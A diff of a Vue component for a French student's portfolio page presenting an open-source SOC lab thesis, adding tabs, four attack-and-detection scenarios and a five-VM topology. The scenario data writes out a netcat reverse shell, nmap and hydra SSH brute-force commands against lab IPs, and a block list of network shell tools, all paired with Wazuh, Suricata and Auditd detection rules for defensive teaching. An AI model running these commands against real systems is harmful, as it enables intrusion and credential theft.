@@ -30,18 +30,58 @@
     </div>
 
     <!-- ══════════════════════════════════════════════
+         ONGLETS DE NAVIGATION INTERACTIFS
+    ════════════════════════════════════════════════ -->
+    <div class="soc-tab-nav" role="tablist" aria-label="Sections du projet SOC">
+      <button
+        class="soc-tab-btn"
+        :class="{ 'soc-tab-btn--active': activeTab === 'phases' }"
+        type="button"
+        role="tab"
+        :aria-selected="activeTab === 'phases'"
+        @click="activeTab = 'phases'"
+      >
+        <Layers :size="16" />
+        <span>9 Phases de Déploiement</span>
+      </button>
+      <button
+        class="soc-tab-btn"
+        :class="{ 'soc-tab-btn--active': activeTab === 'scenarios' }"
+        type="button"
+        role="tab"
+        :aria-selected="activeTab === 'scenarios'"
+        @click="activeTab = 'scenarios'"
+      >
+        <ShieldAlert :size="16" />
+        <span>4 Scénarios d'Attaque (Tests Réels)</span>
+        <span class="soc-tab-count">4 Validés</span>
+      </button>
+      <button
+        class="soc-tab-btn"
+        :class="{ 'soc-tab-btn--active': activeTab === 'topology' }"
+        type="button"
+        role="tab"
+        :aria-selected="activeTab === 'topology'"
+        @click="activeTab = 'topology'"
+      >
+        <Server :size="16" />
+        <span>Topologie Lab (5 VMs NAT)</span>
+      </button>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
          TERMINAL BAR — Ligne commande défilante
     ════════════════════════════════════════════════ -->
     <div class="soc-terminal-bar" aria-hidden="true">
       <span class="term-prompt">root@soc-lab:~#</span>
-      <span class="term-cmd" ref="termCmdEl">incident_response --timeline --verbose --phases=9</span>
+      <span class="term-cmd" ref="termCmdEl">{{ activeTab === 'scenarios' ? 'attack_simulation --mitre --scenarios=4 --status=validated' : activeTab === 'topology' ? 'netstat -tulpn --virtualbox --vms=5' : 'incident_response --timeline --verbose --phases=9' }}</span>
       <span class="term-cursor">▋</span>
     </div>
 
     <!-- ══════════════════════════════════════════════
-         TIMELINE VERTICALE CENTRÉE
+         VUE 1 : TIMELINE VERTICALE (9 PHASES)
     ════════════════════════════════════════════════ -->
-    <div class="soc-timeline-track" role="list">
+    <div v-show="activeTab === 'phases'" class="soc-timeline-track" role="list">
       <!-- Ligne verticale centrale -->
       <div class="soc-center-line" aria-hidden="true">
         <div class="soc-center-line__fill" :style="{ height: lineProgress + '%' }"></div>
@@ -54,7 +94,7 @@
         class="soc-phase-row"
         :class="[
           idx % 2 === 0 ? 'phase-row--left' : 'phase-row--right',
-          { 'phase-row--visible': visiblePhases.has(idx) },
+          { 'phase-row--visible': visiblePhaseIndices.includes(idx) },
           `phase-row--${phase.severity}`,
         ]"
         :data-phase-idx="idx"
@@ -92,6 +132,26 @@
             <h3 class="soc-phase-card__title">{{ phase.title }}</h3>
             <p class="soc-phase-card__body">{{ phase.body }}</p>
 
+            <!-- Capture d'écran / visuel de la phase -->
+            <button
+              v-if="phase.image"
+              class="soc-phase-img-btn"
+              type="button"
+              :aria-label="`Agrandir la capture : ${phase.title}`"
+              @click.stop="$emit('open-lightbox', [phase.image], 0, phase.title)"
+            >
+              <img
+                :src="phase.image"
+                :alt="phase.imageAlt || phase.title"
+                class="soc-phase-img"
+                loading="lazy"
+              />
+              <span class="soc-phase-img__overlay" aria-hidden="true">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
+                Agrandir
+              </span>
+            </button>
+
             <!-- Terminal output box -->
             <div v-if="phase.snippet" class="soc-term-box">
               <div class="soc-term-box__bar" aria-hidden="true">
@@ -109,6 +169,178 @@
               Voir les logs et playbooks
             </button>
           </article>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         VUE 2 : 4 SCÉNARIOS D'ATTAQUE (TESTS RÉELS)
+    ══════════════════════════════════════════════ -->
+    <div v-show="activeTab === 'scenarios'" class="soc-scenarios-view">
+      <div class="soc-scenarios-intro">
+        <h3 class="soc-scenarios-title">
+          <ShieldAlert :size="22" style="color: #ff6b35;" />
+          4 Scénarios d'Attaque &amp; Réponse Automatisée (Validés)
+        </h3>
+        <p class="soc-scenarios-desc">
+          Validation pratique du SOC sous VirtualBox NAT. Chaque scénario simule une attaque réaliste (Red Team Kali Linux) contre les endpoints et démontre la chaîne complète : détection, corrélation, réponse active et enrichissement IA.
+        </p>
+      </div>
+
+      <div class="soc-scenarios-grid">
+        <article
+          v-for="sc in scenarios"
+          :key="sc.id"
+          class="soc-scenario-card glass-card"
+          :class="`soc-scenario-card--${sc.severity}`"
+        >
+          <!-- Entête scénario -->
+          <div class="soc-sc-header">
+            <div class="soc-sc-tags">
+              <span class="soc-sc-number">SCÉNARIO {{ sc.number }}</span>
+              <span class="severity-badge" :class="`severity-badge--${sc.severity}`">
+                <component :is="severityIcon(sc.severity)" :size="11" />
+                {{ severityLabel(sc.severity) }}
+              </span>
+              <span class="mitre-tag">MITRE {{ sc.mitre }}</span>
+            </div>
+            <span class="soc-sc-status">
+              <CheckCircle :size="14" />
+              {{ sc.status }}
+            </span>
+          </div>
+
+          <h4 class="soc-sc-title">{{ sc.title }}</h4>
+          <p class="soc-sc-desc">{{ sc.shortDesc }}</p>
+
+          <!-- Détails cibles & vecteurs -->
+          <div class="soc-sc-meta-grid">
+            <div class="soc-sc-meta-item">
+              <span class="soc-sc-meta-label">🔴 Attaquant :</span>
+              <span class="soc-sc-meta-val code-text">{{ sc.attacker }}</span>
+            </div>
+            <div class="soc-sc-meta-item">
+              <span class="soc-sc-meta-label">🎯 Cible(s) :</span>
+              <span class="soc-sc-meta-val code-text">{{ sc.target }}</span>
+            </div>
+            <div class="soc-sc-meta-item full-width">
+              <span class="soc-sc-meta-label">⚡ Vecteur d'attaque :</span>
+              <span class="soc-sc-meta-val">{{ sc.vector }}</span>
+            </div>
+            <div class="soc-sc-meta-item full-width">
+              <span class="soc-sc-meta-label">🛡️ Détection &amp; Déclencheur :</span>
+              <span class="soc-sc-meta-val">{{ sc.detection }}</span>
+            </div>
+            <div class="soc-sc-meta-item full-width">
+              <span class="soc-sc-meta-label">⚡ Réponse Automatisée :</span>
+              <span class="soc-sc-meta-val highlight-val">{{ sc.response }}</span>
+            </div>
+          </div>
+
+          <!-- Capture d'écran scénario -->
+          <button
+            v-if="sc.image"
+            class="soc-phase-img-btn"
+            type="button"
+            :aria-label="`Agrandir la preuve : ${sc.title}`"
+            @click.stop="$emit('open-lightbox', [sc.image], 0, sc.title)"
+          >
+            <img
+              :src="sc.image"
+              :alt="sc.imageAlt || sc.title"
+              class="soc-phase-img"
+              loading="lazy"
+            />
+            <span class="soc-phase-img__overlay" aria-hidden="true">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7"/></svg>
+              Voir la preuve de validation
+            </span>
+          </button>
+
+          <!-- Terminal output box -->
+          <div v-if="sc.snippet" class="soc-term-box">
+            <div class="soc-term-box__bar" aria-hidden="true">
+              <span class="dot dot--red"></span>
+              <span class="dot dot--yellow"></span>
+              <span class="dot dot--green"></span>
+              <span class="soc-term-box__label">{{ sc.snippetLabel || 'preuve d\'exécution' }}</span>
+            </div>
+            <pre class="soc-term-box__code"><code>{{ sc.snippet }}</code></pre>
+          </div>
+
+          <!-- Bouton modal playbook -->
+          <button class="soc-detail-btn" type="button" @click="openModal(sc)">
+            <FileText :size="13" />
+            Voir les commandes Kali, règles Wazuh &amp; Playbooks
+          </button>
+        </article>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════════
+         VUE 3 : TOPOLOGIE DU LABORATOIRE (5 VMs)
+    ══════════════════════════════════════════════ -->
+    <div v-show="activeTab === 'topology'" class="soc-topology-view">
+      <div class="soc-scenarios-intro">
+        <h3 class="soc-scenarios-title">
+          <Server :size="22" style="color: #ff6b35;" />
+          Topologie Réseau &amp; Infrastructure (5 Machines Virtuelles)
+        </h3>
+        <p class="soc-scenarios-desc">
+          Réseau virtuel isolé NAT <code>192.168.100.0/24</code> sur Oracle VirtualBox 7.0 simulant l'infrastructure d'entreprise PANESS IT avec séparation des rôles SIEM, services SOAR, endpoints de production et poste d'attaque Kali Linux.
+        </p>
+      </div>
+
+      <!-- Aperçu diagramme -->
+      <div class="soc-topo-diagram-card glass-card">
+        <div class="soc-topo-diagram-header">
+          <span class="soc-hero-badge"><Network :size="14" /> Architecture Lab NAT (192.168.100.0/24)</span>
+          <button
+            class="soc-detail-btn"
+            type="button"
+            @click.stop="$emit('open-lightbox', ['/soc/soc-architecture.jpg'], 0, 'Architecture Réseau Lab 5 VMs')"
+          >
+            <ExternalLink :size="14" />
+            Agrandir le diagramme
+          </button>
+        </div>
+        <img
+          src="/soc/soc-architecture.jpg"
+          alt="Diagramme VirtualBox NAT 5 VMs"
+          class="soc-topo-diagram-img"
+          @click.stop="$emit('open-lightbox', ['/soc/soc-architecture.jpg'], 0, 'Architecture Réseau Lab 5 VMs')"
+        />
+      </div>
+
+      <!-- Grille des 5 VMs -->
+      <div class="soc-vms-grid">
+        <div
+          v-for="vm in topologyVms"
+          :key="vm.name"
+          class="soc-vm-card glass-card"
+          :style="{ '--vm-accent': vm.color }"
+        >
+          <div class="soc-vm-header">
+            <div>
+              <span class="soc-vm-badge" :style="{ color: vm.color, borderColor: vm.color + '50', background: vm.color + '20' }">
+                {{ vm.status }}
+              </span>
+              <h4 class="soc-vm-name">{{ vm.name }}</h4>
+            </div>
+            <span class="soc-vm-ip">{{ vm.ip }}</span>
+          </div>
+
+          <div class="soc-vm-meta">
+            <span class="soc-vm-os"><strong>OS :</strong> {{ vm.os }}</span>
+            <span class="soc-vm-role"><strong>Rôle :</strong> {{ vm.role }}</span>
+          </div>
+
+          <div class="soc-vm-services">
+            <span class="soc-vm-services-title">Services &amp; Ports :</span>
+            <ul>
+              <li v-for="srv in vm.services" :key="srv">{{ srv }}</li>
+            </ul>
+          </div>
         </div>
       </div>
     </div>
@@ -206,17 +438,20 @@ import {
   Bug,
   Network,
   HardDrive,
+  Layers,
+  ExternalLink,
 } from 'lucide-vue-next';
 
 defineProps({
   pdfUrl: { type: String, default: '' },
 });
 
+const activeTab = ref('phases'); // 'phases' | 'scenarios' | 'topology'
 const wrapperEl = ref(null);
 const termCmdEl = ref(null);
 const activePhase = ref(null);
-const visiblePhases = ref(new Set());
-const lineProgress = ref(0);
+const visiblePhaseIndices = ref([0, 1, 2, 3, 4, 5, 6, 7, 8]);
+const lineProgress = ref(100);
 
 // ──────────────────────────────────────────────
 // KPIs du mémoire
@@ -250,6 +485,8 @@ const phases = [
     tool: 'PANESS IT',
     icon: Info,
     severity: 'info',
+    image: '/soc/soc-architecture.jpg',
+    imageAlt: 'Architecture VirtualBox NAT — 5 VMs SOC-Network PANESS IT',
     snippetLabel: 'objectif du mémoire',
     body: 'Architecture complète d\'un centre d\'opérations de sécurité (SOC) fondé exclusivement sur des outils open‑source, conçue, déployée et validée en environnement virtualisé pour l\'entreprise PANESS IT (PME informatique de Yaoundé). Mémoire de Licence Professionnelle RSI — IHTM.',
     snippet: `Architecture SOC Open-Source — PANESS IT (2026)
@@ -281,6 +518,8 @@ Hyperviseur: Oracle VirtualBox 7.0`,
     tool: 'Wazuh v4.14.5',
     icon: Server,
     severity: 'info',
+    image: '/soc/wazuh-dashboard.jpg',
+    imageAlt: 'Wazuh SIEM Dashboard — alertes de sécurité en temps réel',
     snippetLabel: '/var/ossec/etc/ossec.conf',
     body: 'Déploiement du serveur Wazuh (SIEM central) via l\'OVA officielle sur Amazon Linux 2023. Configuration du Manager avec OpenSearch intégré, du Wazuh Dashboard (:443) et paramétrage des seuils d\'alertes. Point d\'entrée unique pour la corrélation de tous les événements de sécurité.',
     snippet: `[root@wazuh-server ~]# systemctl status wazuh-manager
@@ -448,6 +687,8 @@ wireshark:yellow`,
   {
     id: 'yara-fim',
     title: 'Phase 5 — YARA Active Response (Anti-Malware)',
+    image: '/soc/yara-terminal.jpg',
+    imageAlt: 'Terminal YARA — détection et suppression automatique malware (EICAR)',
     tool: 'YARA v4.5.1 + Valhalla',
     icon: Bug,
     severity: 'critical',
@@ -631,6 +872,8 @@ def send_telegram(message: str):
     tool: 'Shuffle SOAR :3001',
     icon: Zap,
     severity: 'medium',
+    image: '/soc/shuffle-soar.jpg',
+    imageAlt: 'Shuffle SOAR — workflow automatisé 5 étapes (Wazuh→VirusTotal→DeepSeek→IRIS→Telegram)',
     snippetLabel: 'Shuffle Workflow — Automated Playbook',
     body: 'Déploiement de Shuffle SOAR pour orchestrer les flux de réponse automatisée. Les workflows Shuffle reçoivent les alertes Wazuh via webhook, interrogent VirusTotal pour la réputation des IOCs, appellent l\'API DeepSeek pour l\'enrichissement, créent le ticket IRIS et notifient Telegram — le tout de façon entièrement automatisée sans intervention humaine.',
     snippet: `[SHUFFLE] Webhook received — Wazuh Alert Level 15
@@ -673,6 +916,217 @@ Trigger: Wazuh Webhook (HTTP POST :3001)
 ];
 
 // ──────────────────────────────────────────────
+// 4 SCÉNARIOS D'ATTAQUE (Tests réels de validation)
+// ──────────────────────────────────────────────
+const scenarios = [
+  {
+    id: 'sc-malware',
+    number: '01',
+    title: 'Scénario 1 : Détection Malware & Active Response YARA',
+    shortDesc: 'Dépôt d\'un binaire/fichier de test malveillant (EICAR) sur endpoint Linux & Windows.',
+    severity: 'critical',
+    mitre: 'T1204 / T1059',
+    attacker: 'kali-attacker (192.168.100.50)',
+    target: 'agent-linux (192.168.100.30) & agent-windows (192.168.100.40)',
+    vector: 'Dépôt du payload malveillant /home/raoulbiga/eicar_final6.txt',
+    detection: 'FIM Wazuh intercepte l\'écriture et appelle yara.py (Règles Valhalla). Signature identifiée → Règle 108001 (Niveau 15 - Critique).',
+    response: 'Active Response remove-threat.sh supprime immédiatement le fichier malveillant (< 0.8s).',
+    status: 'Auto-Remediated (< 1s)',
+    image: '/soc/yara-terminal.jpg',
+    imageAlt: 'Preuve d\'exécution YARA Active Response',
+    snippetLabel: 'Active Response Log — /var/ossec/logs/active-responses.log',
+    snippet: `[ALERT] Wazuh Rule 108001 (Level 15) fired:
+  Target : /home/raoulbiga/eicar_final6.txt
+  Match  : YARA rule 'eicar_test'
+[ACTION] Triggering /var/ossec/active-response/bin/remove-threat.sh
+[RESULT] File successfully deleted from filesystem. Threat neutralised in 0.74s.`,
+    playbook: `# Test d'attaque : Dépôt de payload EICAR
+echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /home/raoulbiga/eicar_final6.txt
+
+# Règle Wazuh 108001 (local_rules.xml)
+<rule id="108001" level="15">
+  <if_sid>100200</if_sid>
+  <match>YARA match</match>
+  <description>YARA: Fichier malveillant détecté $(yara.rule)</description>
+  <mitre><id>T1204</id></mitre>
+</rule>`,
+    modalLabel: 'Scénario 1 : Playbook & Règles YARA',
+    details: [
+      'Surveillance FIM temps réel (File Integrity Monitoring) sur les répertoires sensibles (/home, /tmp)',
+      'Intégration du moteur YARA v4.5.1 avec le jeu de règles Valhalla (Nextron Systems)',
+      'Script Active Response remove-threat.sh configuré pour purger immédiatement le malware',
+      'Zéro impact utilisateur, intégrité du système rétablie sans redémarrage',
+    ],
+  },
+  {
+    id: 'sc-nmap',
+    number: '02',
+    title: 'Scénario 2 : Reconnaissance Nmap & Brute-Force SSH',
+    shortDesc: 'Scan de ports SYN furtif et tentatives de connexion SSH automatisées par force brute.',
+    severity: 'high',
+    mitre: 'T1046 / T1110',
+    attacker: 'kali-attacker (192.168.100.50)',
+    target: 'agent-linux (192.168.100.30:22)',
+    vector: 'nmap -sS -p- 192.168.100.30 && hydra -l root -P rockyou.txt ssh://192.168.100.30',
+    detection: 'Suricata NIDS capture le scan SYN (Signature 2001219) sur eth2. Wazuh agrège les alertes eve.json et les échecs auth.log (Règle 86601).',
+    response: 'Levée d\'alerte Niveau 10 au SIEM, corrélation multi-sources et blocage de l\'IP attaquante.',
+    status: 'Detected & Blocked',
+    image: '/soc/wazuh-dashboard.jpg',
+    imageAlt: 'Dashboard Wazuh - Détection de l\'attaque SSH',
+    snippetLabel: 'Suricata eve.json + Wazuh Correlation',
+    snippet: `{"timestamp":"2026-06-29T14:32:10","event_type":"alert","src_ip":"192.168.100.50","dest_ip":"192.168.100.30","alert":{"signature":"ET SCAN Potential SSH Scan OUTBOUND","signature_id":2001219}}
+[WAZUH] Rule 86601 triggered: Multiple SSH failed logins from same IP (192.168.100.50)
+[SOC] Alert escalated to Tier 1 Analyst`,
+    playbook: `# Commandes de simulation (Kali Linux)
+nmap -sS -T4 -p 22,80,443,8443 192.168.100.30
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.100.30 -t 4
+
+# Règle Suricata (suricata.rules)
+alert tcp any any -> $HOME_NET 22 (msg:"ET SCAN Potential SSH Scan"; flags:S; threshold:type both, track by_src, count 5, seconds 60; sid:2001219; rev:1;)`,
+    modalLabel: 'Scénario 2 : Commandes Kali & Règles Suricata',
+    details: [
+      'Suricata NIDS déployé en écoute passive sur l\'interface réseau interne eth2',
+      'Corrélation Wazuh entre événements réseau Suricata (eve.json) et logs système Linux (auth.log)',
+      'Détection automatique de cadence anormale de paquets SYN et tentatives d\'authentification répétées',
+      'Cartographie MITRE ATT&CK T1046 (Network Service Discovery) et T1110 (Brute Force)',
+    ],
+  },
+  {
+    id: 'sc-cmd',
+    number: '03',
+    title: 'Scénario 3 : Exécution de Commandes Suspectes (Netcat)',
+    shortDesc: 'Tentative d\'ouverture d\'un shell distant inverse via netcat sur un serveur Linux.',
+    severity: 'critical',
+    mitre: 'T1059 / T1071',
+    attacker: 'kali-attacker (192.168.100.50:4444)',
+    target: 'agent-linux (192.168.100.30)',
+    vector: '/bin/nc -e /bin/bash 192.168.100.50 4444 (Reverse Shell)',
+    detection: 'Auditd capture le syscall execve() avec comm="nc". Wazuh consulte la liste CDB etc/lists/suspicious-programs et déclenche la Règle 100210 (Niveau 12).',
+    response: 'Alerte critique immédiate avec extraction de l\'UID utilisateur, du PID et de la ligne de commande complète.',
+    status: 'Interception Réussie',
+    image: '/soc/soc-architecture.jpg',
+    imageAlt: 'Architecture d\'interception Auditd & Wazuh',
+    snippetLabel: 'Auditd Syscall Interception Log',
+    snippet: `type=SYSCALL msg=audit(1719668573.821:492): arch=c000003e syscall=59 success=yes exit=0 a0=55a3 comm="nc" exe="/usr/bin/nc.traditional"
+[CDB LOOKUP] Match found: 'nc:red' in suspicious-programs
+[RULE 100210] CRITICAL (Level 12): Commande suspecte détectée (nc)
+  User: raoulbiga (uid 1000) | PID: 4823`,
+    playbook: `# Configuration Auditd (/etc/audit/rules.d/audit.rules)
+-a always,exit -F arch=b64 -S execve -k suspicious_exec
+
+# Liste CDB (/var/ossec/etc/lists/suspicious-programs)
+nc:red
+ncat:red
+netcat:red
+nmap:red
+socat:red`,
+    modalLabel: 'Scénario 3 : Règles Auditd & Base CDB',
+    details: [
+      'Auditd configuré avec des règles de traçage des appels système execve() sous Linux Debian 12',
+      'Sysmon configuré sous Windows 10 (EventID 1 Process Creation) pour couverture cross-platform',
+      'Base CDB compilée en mémoire pour une recherche binaire instantanée (< 1ms)',
+      'Conformité avec les exigences de contrôle d\'accès PCI-DSS 10.6.1 et RGPD Article 35',
+    ],
+  },
+  {
+    id: 'sc-soar',
+    number: '04',
+    title: 'Scénario 4 : Pipeline Automatisé SOAR & IA (Shuffle + DeepSeek + IRIS)',
+    shortDesc: 'Orchestration complète du flux d\'incident : de l\'alerte brute à la notification Telegram enrichie par IA.',
+    severity: 'medium',
+    mitre: 'Incident Response Automation',
+    attacker: 'kali-attacker (192.168.100.50)',
+    target: 'Infrastructure SOC PANESS IT',
+    vector: 'Alerte Wazuh critique transmise par Webhook au SOAR Shuffle (:3001)',
+    detection: 'Shuffle reçoit le JSON de l\'alerte, extrait l\'IP et le hash du malware.',
+    response: 'Vérification VirusTotal + Analyse contextuelle par l\'IA DeepSeek + Création du ticket dans DFIR-IRIS (:8443) + Notification Push Telegram (< 4.2s).',
+    status: 'Automated Pipeline (4.2s)',
+    image: '/soc/shuffle-soar.jpg',
+    imageAlt: 'Workflow SOAR Shuffle 5 étapes',
+    snippetLabel: 'Shuffle SOAR Execution Pipeline Log',
+    snippet: `[SHUFFLE] Webhook received — Wazuh Alert Level 15
+[STEP 1] Extract IOCs -> IP: 192.168.100.50, Hash: eicar.txt
+[STEP 2] VirusTotal API lookup -> Reputation score: Clean
+[STEP 3] DeepSeek LLM Analysis -> "Menace identifiée : Fichier de test EICAR neutralisé..."
+[STEP 4] DFIR-IRIS -> Case #3 created (Severity: Critical, Status: Open)
+[STEP 5] Telegram Push -> Message delivered to SOC Bot1
+[STATUS] Workflow completed in 4.18 seconds ✓`,
+    playbook: `# Payload Webhook envoyé par Wazuh (ossec.conf)
+<integration>
+  <name>shuffle</name>
+  <hook_url>http://192.168.100.20:3001/api/v1/hooks/HOOK_ID</hook_url>
+  <level>9</level>
+  <alert_format>json</alert_format>
+</integration>
+
+# Message Telegram envoyé automatiquement aux analystes
+🔴 *[SOC PANESS IT]* ALERTE CRITIQUE (Niveau 15)
+Règle: 108001 — YARA Malware détecté & supprimé
+Hôte: agent-linux (192.168.100.30)
+Ticket IRIS: Case #3
+Analyse DeepSeek: "Neutralisation automatique réussie."`,
+    modalLabel: 'Scénario 4 : Workflow Shuffle & Template Telegram',
+    details: [
+      'Shuffle SOAR déployé sous Docker sur la VM soc-services (:3001)',
+      'Intégration de l\'API IA DeepSeek pour la contextualisation des alertes en langage naturel',
+      'Création automatisée d\'incidents structurés dans la plateforme DFIR-IRIS (:8443)',
+      'Notification push instantanée vers les smartphones des analystes via Telegram Bot',
+    ],
+  },
+];
+
+// ──────────────────────────────────────────────
+// TOPOLOGIE LAB (5 Machines Virtuelles)
+// ──────────────────────────────────────────────
+const topologyVms = [
+  {
+    name: 'wazuh-server',
+    ip: '192.168.100.10',
+    os: 'Amazon Linux 2023 (OVA)',
+    role: 'SIEM & Corrélation Centrale',
+    services: ['Wazuh Manager :1514', 'OpenSearch :9200', 'Dashboard HTTPS :443', 'Suricata NIDS (eth2)'],
+    status: 'Online',
+    color: '#e95420',
+  },
+  {
+    name: 'soc-services',
+    ip: '192.168.100.20',
+    os: 'Ubuntu 24.04 LTS (Docker)',
+    role: 'Services SOC & Orchestration SOAR',
+    services: ['MISP :1443 (Threat Intel)', 'DFIR-IRIS :8443 (Incidents)', 'Shuffle SOAR :3001', 'RabbitMQ / PostgreSQL'],
+    status: 'Online',
+    color: '#a855f7',
+  },
+  {
+    name: 'agent-linux',
+    ip: '192.168.100.30',
+    os: 'Debian 12 Bookworm',
+    role: 'Endpoint Linux Surveillé',
+    services: ['Wazuh Agent v4.14.5', 'Auditd (execve rules)', 'YARA v4.5.1 + Valhalla', 'remove-threat.sh'],
+    status: 'Online',
+    color: '#10b981',
+  },
+  {
+    name: 'agent-windows',
+    ip: '192.168.100.40',
+    os: 'Windows 10 Pro',
+    role: 'Endpoint Windows Surveillé',
+    services: ['Wazuh Agent v4.14.5', 'Sysmon (EventID 1)', 'YARA (yara64.exe)', 'yara.py Active Response'],
+    status: 'Online',
+    color: '#38bdf8',
+  },
+  {
+    name: 'kali-attacker',
+    ip: '192.168.100.50',
+    os: 'Kali Linux Rolling',
+    role: 'Simulateur d\'Attaques (Red Team)',
+    services: ['Nmap (SYN Scans)', 'Hydra (SSH Brute Force)', 'Netcat / Payload EICAR', 'Metasploit Framework'],
+    status: 'Active',
+    color: '#ef4444',
+  },
+];
+
+// ──────────────────────────────────────────────
 // Scroll Reveal & Line Progress
 // ──────────────────────────────────────────────
 let observer;
@@ -688,25 +1142,44 @@ function closeModal() {
 }
 
 onMounted(() => {
-  observer = new IntersectionObserver(
-    (entries) => {
-      entries.forEach((entry) => {
-        if (entry.isIntersecting) {
-          const idx = parseInt(entry.target.dataset.phaseIdx, 10);
-          if (!isNaN(idx)) {
-            setTimeout(() => {
-              visiblePhases.value = new Set([...visiblePhases.value, idx]);
-              // Avancer la ligne proportionnellement
-              lineProgress.value = Math.round(((Math.max(...[...visiblePhases.value, idx]) + 1) / phases.length) * 100);
-            }, idx * 80);
-          }
+  // Fallback : rendre toutes les phases visibles après 400ms même sans scroll
+  const revealAll = () => {
+    phases.forEach((_, idx) => {
+      setTimeout(() => {
+        if (!visiblePhaseIndices.value.includes(idx)) {
+          visiblePhaseIndices.value.push(idx);
         }
-      });
-    },
-    { threshold: 0.12, rootMargin: '0px 0px -80px 0px' },
-  );
+        lineProgress.value = Math.round(((idx + 1) / phases.length) * 100);
+      }, idx * 120);
+    });
+  };
 
-  document.querySelectorAll('.soc-phase-row').forEach((el) => observer.observe(el));
+  // IntersectionObserver sur le wrapper local
+  if (wrapperEl.value) {
+    observer = new IntersectionObserver(
+      (entries) => {
+        entries.forEach((entry) => {
+          if (entry.isIntersecting) {
+            const idx = parseInt(entry.target.dataset.phaseIdx, 10);
+            if (!isNaN(idx) && !visiblePhaseIndices.value.includes(idx)) {
+              setTimeout(() => {
+                visiblePhaseIndices.value.push(idx);
+                const maxIdx = Math.max(...visiblePhaseIndices.value);
+                lineProgress.value = Math.round(((maxIdx + 1) / phases.length) * 100);
+              }, 80);
+            }
+          }
+        });
+      },
+      { threshold: 0.08, rootMargin: '0px 0px -40px 0px' },
+    );
+    wrapperEl.value.querySelectorAll('.soc-phase-row').forEach((el) => observer.observe(el));
+  }
+
+  // On déclenche le fallback au bout de 300ms si l'observer n'a rien capté
+  setTimeout(() => {
+    if (visiblePhaseIndices.value.length === 0) revealAll();
+  }, 300);
 
   // Animation typographie terminal
   if (termCmdEl.value) {
@@ -731,58 +1204,67 @@ onBeforeUnmount(() => {
 
 <style scoped>
 /* ══════════════════════════════════════════════
-   WRAPPER GLOBAL
+   WRAPPER GLOBAL — Thème Dark SOC
 ══════════════════════════════════════════════ */
 .soc-timeline-wrapper {
   width: 100%;
-  padding: 0 0 40px;
-  color: var(--text);
+  padding: 24px 16px 64px;
+  color: #fdf8ff;
   font-family: 'Ubuntu', 'Ubuntu Sans', system-ui, sans-serif;
+  background: transparent;
 }
 
 /* ══════════════════════════════════════════════
    HERO HEADER
 ══════════════════════════════════════════════ */
 .soc-hero-header {
-  max-width: 780px;
-  margin: 0 auto 32px;
+  max-width: 860px;
+  margin: 0 auto 36px;
   text-align: center;
 }
 
 .soc-hero-badge {
   display: inline-flex;
   align-items: center;
-  gap: 6px;
+  gap: 7px;
   font-size: 12px;
-  font-weight: 700;
-  letter-spacing: 0.08em;
+  font-weight: 800;
+  letter-spacing: 0.1em;
   text-transform: uppercase;
-  color: #e95420;
-  background: rgba(233, 84, 32, 0.08);
-  border: 1px solid rgba(233, 84, 32, 0.22);
-  padding: 5px 12px;
+  color: #ff7a45;
+  background: rgba(233, 84, 32, 0.14);
+  border: 1px solid rgba(233, 84, 32, 0.4);
+  padding: 6px 14px;
   border-radius: 20px;
   margin-bottom: 18px;
+  box-shadow: 0 0 16px rgba(233, 84, 32, 0.2);
 }
 
 .soc-hero-title {
-  margin: 0 0 14px;
-  font-size: clamp(26px, 4vw, 38px);
-  font-weight: 800;
+  margin: 0 0 16px;
+  font-size: clamp(28px, 4.2vw, 42px);
+  font-weight: 900;
   line-height: 1.15;
   letter-spacing: -0.02em;
-  color: #2c001e;
+  color: #ffffff;
 }
 
 .soc-hero-title--accent {
-  color: #e95420;
+  color: #ff6b35;
+  text-shadow: 0 0 24px rgba(233, 84, 32, 0.35);
 }
 
 .soc-hero-desc {
-  margin: 0 0 20px;
-  color: var(--muted);
-  font-size: 16px;
+  margin: 0 auto 24px;
+  max-width: 720px;
+  color: rgba(255, 255, 255, 0.82);
+  font-size: 15.5px;
   line-height: 1.7;
+}
+
+.soc-hero-desc strong {
+  color: #ffffff;
+  font-weight: 700;
 }
 
 .soc-hero-pills {
@@ -800,13 +1282,13 @@ onBeforeUnmount(() => {
   border: 1px solid transparent;
 }
 
-.pill--orange  { background: rgba(233,84,32,0.09);  color: #e95420; border-color: rgba(233,84,32,0.25); }
-.pill--red     { background: rgba(220,38,38,0.08);  color: #dc2626; border-color: rgba(220,38,38,0.22); }
-.pill--purple  { background: rgba(119,33,111,0.09); color: #77216f; border-color: rgba(119,33,111,0.22); }
-.pill--blue    { background: rgba(37,99,235,0.08);  color: #1d4ed8; border-color: rgba(37,99,235,0.2); }
-.pill--indigo  { background: rgba(67,56,202,0.08);  color: #4338ca; border-color: rgba(67,56,202,0.2); }
-.pill--green   { background: rgba(5,150,105,0.08);  color: #059669; border-color: rgba(5,150,105,0.2); }
-.pill--teal    { background: rgba(20,184,166,0.08); color: #0d9488; border-color: rgba(20,184,166,0.2); }
+.pill--orange  { background: rgba(233,84,32,0.18);  color: #ff9d6c; border-color: rgba(233,84,32,0.4); }
+.pill--red     { background: rgba(220,38,38,0.18);  color: #f87171; border-color: rgba(220,38,38,0.4); }
+.pill--purple  { background: rgba(168,85,247,0.18); color: #d8b4fe; border-color: rgba(168,85,247,0.4); }
+.pill--blue    { background: rgba(37,99,235,0.18);  color: #93c5fd; border-color: rgba(37,99,235,0.4); }
+.pill--indigo  { background: rgba(99,102,241,0.18); color: #c7d2fe; border-color: rgba(99,102,241,0.4); }
+.pill--green   { background: rgba(16,185,129,0.18); color: #6ee7b7; border-color: rgba(16,185,129,0.4); }
+.pill--teal    { background: rgba(20,184,166,0.18); color: #5eead4; border-color: rgba(20,184,166,0.4); }
 
 /* ══════════════════════════════════════════════
    BARRE TERMINAL
@@ -815,20 +1297,20 @@ onBeforeUnmount(() => {
   display: flex;
   align-items: center;
   gap: 10px;
-  max-width: 680px;
-  margin: 0 auto 56px;
-  padding: 12px 18px;
